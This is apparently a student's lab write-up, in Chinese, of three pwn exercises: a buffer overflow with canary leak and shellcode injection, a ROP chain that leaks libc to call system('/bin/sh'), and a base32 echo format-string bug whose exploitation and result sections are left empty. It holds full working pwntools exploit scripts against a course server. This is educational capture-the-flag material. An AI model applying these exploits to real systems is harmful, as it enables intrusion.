
## 01 - shellcode

### 1 漏洞分析
首先查看安全限制：
![image.png](./assets/1654184748786-0d55c95e-c9ca-4f50-9aed-b33fd388ccf6.png)
没开 NX！

然后查看代码：
![image.png](./assets/1654184995815-b01d33ae-38a0-4ed6-9640-8871b66f7bb2.png)
这里的`read`获取 256 个 bytes，但是 buffer 只有 20 个 bytes，有 buffer overflow 漏洞。结合没开 NX，我们可以用 shellcode 攻击。<br />另外，这里的`printf`用`%s`打印`buffer`，如果`buffer`中没有`\0`，就会一直打印下去，这样我们可以做 overread。


### 2 栈结构
先 send 20 个`'0'`，调试一下试试：
![image.png](./assets/1654185818189-47175ad2-697e-40bd-ac3e-04ddad4becc3.png)
得知栈长这样：
![image.png](./assets/1654186074915-2f7524df-a155-47db-89af-c8aa0d2ff6f1.png)
其中`align`是因为`buffer`的大小不是 8 字节的整倍数带来的对齐。


### 3 获取 canary 和 ret addr
注意到总共会`read`和`printf`3 次，我们可以利用 overread 首先获取 canary 和 ret addr（获取 ret addr 是为了得知栈的位置），然后再利用 overwrite 注入 shellcode。

尝试 send 24 个`'0'`，但是每次都读不出来；结合上面的内容猜想 canary 的末位可能是 00，因此填 25 个，可以读出来了：
![image.png](./assets/1654186493064-5a829551-860f-44ae-8791-7168847cca04.png)
编写了这样的代码，可以正确读到`canary`和`saved rbp`了：
```python
conn.recvuntil(b"data:\n");
conn.send(b'0' * 25);
run1_recv = conn.recvline();
canary = u64(b'\x00' + run1_recv[0x2a:0x31]);
saved_rbp = u64(run1_recv[0x31:0x37] + b'\x00\x00');
```
![image.png](./assets/1654187908546-c57d4517-a22a-42ab-acf1-7b297e30455d.png)
![image.png](./assets/1654187931280-1e852240-6dd9-41f2-9d58-36b2705d227c.png)


### 4 构造 shellcode 注入
拿出我们在 Lab 2 中用过的 shellcode，它的大小是 37Bytes，比`buffer`和`align`要大，因此我们把 shellcode 放在 ret addr 的上面。注意到 saved rbp 指向的位置刚好是 ret addr 上面的位置，也就是我们 shellcode 注入的位置，因此我们直接将 ret addr 覆写成 saved rbp 的值，这样刚好 `ret` 之后就会从我们的 shellcode 开始运行啦！
![image.png](./assets/1654188539491-0b98bd4e-2a83-40b4-85ad-3e316e03dd5b.png)
即，我们构造了这样的 payload：<br />`conn.send(b'0' * 24 + p64(canary) + p64(saved_rbp) + p64(saved_rbp) + shellcode);`<br />其中，24 个`'0'`填充`buffer`和`align`，`p64(canary)`将 canary 还原，两个`p64(saved_rbp)`分别填充 saved rbp 和 ret addr，然后填充 shellcode。


### 5 结果
我们最终使用的代码如下：
```python
from pwn import *
context(arch = 'x86_64', os = 'linux')
context.log_level = 'DEBUG'

conn = remote("116.62.228.23", 10001)

conn.recvuntil("StudentID:\n")
conn.sendline("3190105871")

# === Run 1 ===
conn.recvuntil(b"data:\n");
conn.send(b'0' * 25);
run1_recv = conn.recvline();
canary = u64(b'\x00' + run1_recv[0x2a:0x31]);
saved_rbp = u64(run1_recv[0x31:0x37] + b'\x00\x00');
print("canary = " + hex(canary));
print("saved rbp = " + hex(saved_rbp));

# === Run 2 ===
shellcode = """
        sub	    rsp, 48
        xor     rdx, rdx
        mov     rbx, 0x68732f6e69622f2f
        shr     rbx, 0x8
        push    rbx
        mov     rdi, rsp
        push    rax
        push    rdi
        xor	    rsi, rsi
        xor	    rax, rax
        mov     al, 0x3b
        syscall
"""

shellcode = asm(shellcode)
#shellcode += b'0' * (0xc8 - 0xa0 - int(size(shellcode)[:-1]))

print("Size of shellcode = " + size(shellcode))

conn.send(b'0' * 24 + p64(canary) + p64(saved_rbp) + p64(saved_rbp) + shellcode);

conn.recvuntil(b"data:\n");
conn.send(b'0' * 24);

conn.sendline("./flag.exe 3190105871");
conn.interactive()

```
得到了正确结果！
![image.png](./assets/1654189237508-88f50f9b-c85f-4f0c-9007-5e906b3c3a37.png)

## 02 - re_migrate

### 1 漏洞分析
查看安全限制：
![image.png](./assets/1654190253169-7cfbe87f-52e7-4551-a381-0dc83cb5461b.png)
使用 gdb 跟踪一遍，得到如下的栈和调用结构：
![image.png](./assets/1654191772764-8f6d38d4-9d7e-4187-8900-1c6f4b872a19.png)
其中各个函数用其首字母标明；红色字体表示了对应字段的安全风险。

可以看到，NX 保护是开启的，因此注入 shellcode 是做不了的。我们考虑 ROP。注意到有调用库：
![image.png](./assets/1654191903860-62d6185a-35c5-4cff-a308-aa69a5d10297.png)
因此，我们可以用 ROP 通过 `puts_plt(GOT(puts))` 获取 `puts()` 的实际地址，从而算出库的偏移，进一步算出 `system()` 的实际地址；然后再从`one_kick()`跑一次，将 `'/bin/sh'` 加载到 `rdi` 中；然后调用 `ret` 时会前往 `system()`，即成功运行 shell。


### 2 利用分析过程
起初我想要找办法获取栈偏移从而把`one_punch`的`saved rbp`改成`treasure[]`的位置，然后将`ret addr`改到一个`leave; ret;`的 gadget 从而实现栈迁移，但是没找到怎么获取栈偏移……<br />后来想到，可以考虑直接通过`pop`把栈指针弄到`treasure[]`去，即需要`pop`8 次然后`ret`。找找 gadget：
![image.png](./assets/1654195608478-255d3714-1c52-453b-a01e-6d523580bcdb.png)
发现没有`pop`那么多次的……但是注意到我们可以先`pop`到`one[1]`那里去，因为`one[1]`的值仍保留为用户输入！所以先`pop`5 次，`0x40140b`这个可以用！<br />然后我们将`one[1]`的值改为一个`pop`2 次的 gadget，比如`0x401410`，这样就可以来到我们大控制的`treasure`啦：
![image.png](./assets/1654196650897-9cc235bc-016e-45af-b2de-fcee132585cf.png)
我们在进入`really_fight()`构造这样的`treasure`，这样我们就可以通过 `puts_plt(GOT(puts))` 获取 `puts()` 的实际地址，然后算出`system()`的地址，再一次来到`really_fight()`中：
![image.png](./assets/1654196894079-99a4e582-faf9-45ec-aad8-8be0b763eb68.png)

再一次进入到`really_fight()`中后，我们构造`treasure`，然后在后续的调用中用同样的方式将栈指针移到`treasure`，通过 garget 将 `'/bin/sh'` 加载到 `rdi` 中；然后调用 `ret` 时会前往 `system()`，即成功运行 shell：
![image.png](./assets/1654197107694-915f5ff7-6966-4745-94f3-afe84261ba4f.png)

定位上述需要的参数：
![image.png](./assets/1654197392015-a0efdaea-d31e-4bc1-bd4e-e901ce1367bf.png)
![image.png](./assets/1654198076949-d28fec59-4de6-4936-a7b5-08cc8233fb35.png)


### 3 结果
根据上述分析，我们写出了如下代码（唯一的区别是，在第一趟的`treasure`前面新增一个 ret gadget 从而满足栈对齐的要求）：
```python
from pwn import *

context.log_level = 'DEBUG'

conn = remote("116.62.228.23", 10002)

conn.recvuntil("StudentID:\n")
conn.sendline("3190105871")

pop_5_gadget = 0x000000000040140b
pop_2_gadget = 0x0000000000401410
p_2_g_bytes = b'4199440'
leave_ret = 0x000000000040120d

e = ELF('./02_re_migrate')
puts_plt = e.symbols['puts']
puts_got = e.got['puts']
r_f = e.symbols['really_fight']
rdi_gadget = 0x401413
ret_gadget = 0x40101a

lib_binsh = 0x1b75aa
lib_puts = 0x875a0
lib_system = 0x55410

rbp_target = 0x7ffff0001fff # arbitrary

# === Run 1 ===
#  == r_f() ==
treasure1 = p64(ret_gadget) + p64(rdi_gadget) + p64(puts_got) + p64(puts_plt) + p64(r_f)
conn.recvuntil(b'ing...')
conn.sendline(treasure1)

# == o_k() ==
one1 = p_2_g_bytes
conn.recvuntil(b'[1] damage:')
conn.sendline(b'0')
conn.recvuntil(b'[2] damage:')
conn.sendline(one1)

# == o_p() ==
one_punch = b'A' * 16 + p64(rbp_target) + p64(pop_5_gadget)
conn.recvuntil(b'----->\n')
conn.send(one_punch)

# == get offset ==
storeRecv = conn.recvline()
puts_addr = u64(storeRecv[:-1]  + b'\x00\x00')

lib_base = puts_addr - lib_puts
system_addr = lib_base + lib_system
binsh_addr = lib_base + lib_binsh

# === Run 2 ===
#  == r_f() ==
treasure2 = p64(rdi_gadget) + p64(binsh_addr) + p64(system_addr)
conn.recvuntil(b'ing...')
conn.sendline(treasure2)

# == o_k() ==
one1 = p_2_g_bytes
conn.recvuntil(b'damage:')
conn.sendline(b'0')
conn.recvuntil(b'damage:')
conn.sendline(one1)

# == o_p() ==
one_punch = b'0' * 16 + p64(rbp_target) + p64(pop_5_gadget)
conn.recvuntil(b'----->')
conn.sendline(one_punch)

conn.sendline("./flag.exe 3190105871");
conn.interactive()
```
得到了正确结果！
![image.png](./assets/1654202447309-5c8fc7f2-3a61-4132-b750-853ec5f80756.png)
:::warning
注：本题和 Lab 2 第 2 题一样，都出现本地运行不正确但远程运行正确的问题。具体的表现是一致的，即应当是`"/bin/sh"`的地方变成了`"/usr/share/locale"`：
![image.png](./assets/1654202701741-fad799c4-5baf-4a2d-b3c7-b71112080978.png)
:::

## 03 - b32 echo


### 1 漏洞分析和触发
一个重要的漏洞是，程序不检查解码结果中最后一个字符是否为`%`，而且如果新的解码结果比旧的短，且新的解码结果的字符个数是 5 的整倍数，那么旧的解码结果将保留：
![image.png](./assets/1654204624817-564d9809-e8f3-49c0-b835-4e5b46fe0c01.png)
这样，我们就可以通过每次构造比上一次少 5 个字符的字符串，同时让每次的最后一个字符是`%`，并与后一次的保留的字符构成格式控制字符串，就可以利用 FSB。下面是利用 FSB 读取栈上数据的一例：
```python
def interact_b32(plain):
	conn.recvuntil(b'input: \n')
	coded = b32encode(plain)
	conn.sendline(size(coded)[:-1].encode('utf-8'))
	conn.recvuntil(b'Show it: \n')
	conn.sendline(coded)
	result = conn.recvline()
	print(result)

for i in range(75, 0, -5):
	interact_b32(b'.' * i + b'x...%')
```
![image.png](./assets/1654206166252-dd5f529f-4e4d-4539-8d74-d145b61a9b04.png)

### 2 利用思路分析
FSB 漏洞发生在`echo_actual()`中。用 gdb 查看运行时栈环境：
![image.png](./assets/1655808367771-c57ad004-c352-40b7-a6dd-9932153a35fb.png)
可以看到，运行`printf`时，栈顶前 2 个 64 位是临时使用的，第 3 个 64 位是`saved rbp`，第 4 个 64 位是`ret addr`。<br />查看程序的安全限制：
![image.png](./assets/1655808797131-b0fbf481-770a-4657-bf88-5525112fbafc.png)


### 3 利用过程

### 4 结果
